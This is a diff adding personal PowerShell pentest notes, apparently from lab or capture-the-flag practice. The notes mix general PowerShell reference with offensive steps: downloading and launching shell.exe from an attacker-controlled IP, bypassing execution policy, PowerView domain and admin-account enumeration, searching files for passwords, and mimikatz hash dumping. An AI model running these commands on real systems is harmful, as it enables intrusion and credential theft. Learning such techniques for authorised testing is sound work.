@@ -1,0 +1,72 @@
+### powershell ###
+## link
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+
+## download
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.98.114:80/shell.exe','shell.exe')"
+Start-Process "shell.exe"
+whoami /priv
+
+powershell -ep bypass							#load powershell with exec policy bypassed
+. .\PowerView.ps1 							#import the PowerView module
+Get-Command								#list commands
+Get-Command New-*							#list commands start with New-
+Get-Command | Get-Member						#get properties
+Get-Command Get-Command | Get-Member					#get properties of Get-Command
+Get-Command Get-Command | Get-Member -MemberType Method			#get only methods from properties
+Get-Help Command-Name -examples						#help on command
+ifGet / Start / Stop / Read / Write / New / Out				#common verbs to use
+Get-ChildItem | Get-Member -MemberType Property, CodeProperty		#get some properties of Get-ChildItem
+Get-ChildItem | Select-Object -Property Mode, Name			#grep only Mode and Name Property
+Get-ChildItem | Where-Object {$_.Name -eq 'Admin'}			#grep property name equals Admin
+Get-Service | Where-Object -Property Status -eq Stopped			#stopped processus
+Get-ChildItem | Sort-Object						#sort
+Get-Childitem –Path C:\ -Include *file.* -File -Recurse	-ErrorAction SilentlyContinue		#find a file
+Get-FileHash .\file.txt -Algorithm MD5					#md5sum
+Get-FileHash .\file.txt -Algorithm SHA256				#sha256sum
+Get-Content "C:\Users\Administrator\Desktop\b64.txt"			#cat a file ...
+Get-Location								#pwd
+Get-Command | Measure							#count object result
+Get-Command | Select-Object -First 1					#first result
+(Get-Command Get-LocalUser).Parameters					#get params
+
+## enumerate ##
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+Get-LocalUser							#enum local user
+Get-LocalGroup							#enum local group
+Get-NetIPAddress						#ip adresse
+Get-Process							#running process
+Get-ScheduledTask						#cron
+Get-Acl C:\folder						#get right
+Get-Hotfix							#patched applied
+Get-NetUser | select cn						#enumeration domain user
+Get-NetGroup -GroupName *admin*					#enumeration domain group
+Get-NetComputer -fulldata | select operatingsystem 		#gets a list of all operating systems on the domain
+Invoke-ShareFinder						#enumeration shared folder
+Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}	#find all service accounts in "Domain Admins"
+Get-NetTCPConnection -State Listen				#listen port
+Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue		#find bak file
+Get-ChildItem C:\* -Recurse | Select-String -pattern "pass"	#search file with pass
+
+
+## scripting ##
+https://learnxinyminutes.com/docs/powershell/
+$fs = Get-Childitem –Path 'C:\Users\Administrator\Desktop\emails' -Recurse | Where-Object {$_.Mode -eq '-a----'}
+foreach($f in $fs){
+    $c = Get-Content $f.FullName
+    if ($c -like '*https*') {
+        $f.FullName
+    }
+}
+
+## mimikatz ##
+privilege::debug						#if 20 = admin
+lsadump::lsa /patch						#dump hashes
+
+
+
+
+
+
+
+
